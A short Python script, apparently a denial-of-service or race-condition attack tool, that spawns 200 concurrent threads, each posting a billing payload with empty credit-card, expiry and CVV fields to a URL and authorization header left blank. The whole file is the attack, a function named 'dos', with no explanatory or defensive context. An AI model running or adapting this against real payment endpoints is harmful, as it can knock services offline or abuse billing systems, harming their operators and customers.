import threading
import requests
import time

def dos():
    payload = '{ "action":"billing", "order-id": "", "data": {"ccn": "", "exp": "", "cvv": ""} }'   
    url = ""
    headers = {"Authorization": ""} 
    r = requests.post(url, data=payload, headers=headers)
    print(r.text)

threads = []
for i in range(200):
    t = threading.Thread(target=dos)
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()

print("DONE!")